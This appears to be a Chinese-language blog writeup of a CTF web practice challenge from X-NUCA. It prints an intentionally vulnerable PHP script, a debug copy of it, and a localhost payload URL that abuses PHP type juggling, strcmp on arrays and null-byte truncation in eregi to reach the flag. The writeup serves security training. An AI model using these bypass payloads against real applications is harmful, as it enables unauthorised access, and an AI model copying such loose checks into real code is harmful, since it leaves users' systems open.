---


title: X-NUCA Web练习题

time: 2016.07.24 15:22:00

layout: post

tags:

- Security
- CTF-Web

excerpt: Writeup about X-NUCA.

---
# X-NUCA  Web

## 1. PHP审计题（3）

```
<?php
show_source(__FILE__);
$v1=0;$v2=0;$v3=0;
$a=(array)json_decode(@$_GET['foo']);
var_dump($a);
if(is_array($a)){
    echo 1;
    is_numeric(@$a["bar1"])?die("nope"):NULL;
    if(@$a["bar1"]){
        ($a["bar1"]>2016)?$v1=1:NULL;
    }
    if(is_array(@$a["bar2"])){
        if(count($a["bar2"])!==5 OR !is_array($a["bar2"][0])) die("nope");
        $pos = array_search("nudt", $a["a2"]);
        $pos===false?die("nope"):NULL;
        foreach($a["bar2"] as $key=>$val){
            $val==="nudt"?die("nope"):NULL;
        }
        $v2=1;
    }
}
$c=@$_GET['cat'];
$d=@$_GET['dog'];
if(@$c[1]){
    if(!strcmp($c[1],$d) && $c[1]!==$d){
        eregi("3|1|c",$d.$c[0])?die("nope"):NULL;
        strpos(($c[0].$d), "htctf2016")?$v3=1:NULL;
    }
}
if($v1 && $v2 && $v3){
    include "flag.php";
    echo $flag;
}
?>
```

```
测试代码：
<?php
show_source(__FILE__);
$arr = array (
    "bar1"=>"2017adsad",
    "bar2"=>array(
        "0"=>array(0),
        "1"=>1,
        "2"=>2,
        "3"=>3,
        "4"=>4,
    ),
    "a2"=>"nudt",
    "d"=>4,
    "e"=>5);
echo json_encode($arr);


$v1=0;$v2=0;$v3=0;
$a=(array)json_decode(@$_GET['foo']);
var_dump($a);
if(is_array($a)){
    echo 'lever 1!';
    is_numeric(@$a["bar1"])?die("nope"):NULL;
    if(@$a["bar1"]){
        ($a["bar1"]>2016)?$v1=1:NULL;
    }
    if(is_array(@$a["bar2"])){
        echo 'lever 2!';
        var_dump($a["bar2"]);
        echo(count($a["bar2"]));
        if(count($a["bar2"])!==5 OR !is_array($a["bar2"][0])) die("nope");
        echo 'lever 3!';
        $pos = array_search("nudt", $a["a2"]);
        $pos===false?die("nope"):NULL;
        echo 'lever 4!';
        foreach($a["bar2"] as $key=>$val){
            $val==="nudt"?die("nope"):NULL;
        }
        $v2=1;
    }
}
$c=@$_GET['cat'];
$d=@$_GET['dog'];
var_dump($c[1]);
var_dump(strcmp($c[1],$d));
var_dump($c[1]!==$d);
var_dump((!strcmp($c[1],$d) && $c[1]!==$d));
if(@$c[1]){
    echo 'lever 5!';
    if(!strcmp($c[1],$d) && $c[1]!==$d){
        echo 'lever 6!';
        eregi("3|1|c",$d.$c[0])?die("nope"):NULL;
        echo 'lever 7!';
        strpos(($c[0].$d), "htctf2016")?$v3=1:NULL;
        echo 'lever 8!';
    }
}
var_dump($v1);
var_dump($v2);
var_dump($v3);

if($v1 && $v2 && $v3){
    include "flag.php";
    echo $flag;
}

?>
```
 
```
payload :
http://localhost:8888/sys/test.php?foo={%22bar1%22:%222017adsad%22,%22bar2%22:[[0],1,2,3,4],%22c%22:3,%22d%22:4,%22e%22:5}&&cat[1][]=%221%22&&dog=%00&&cat[0]=%22htctf2016%22
```


----
# 参考：
1. http://blog.csdn.net/u012763794/article/details/50959166

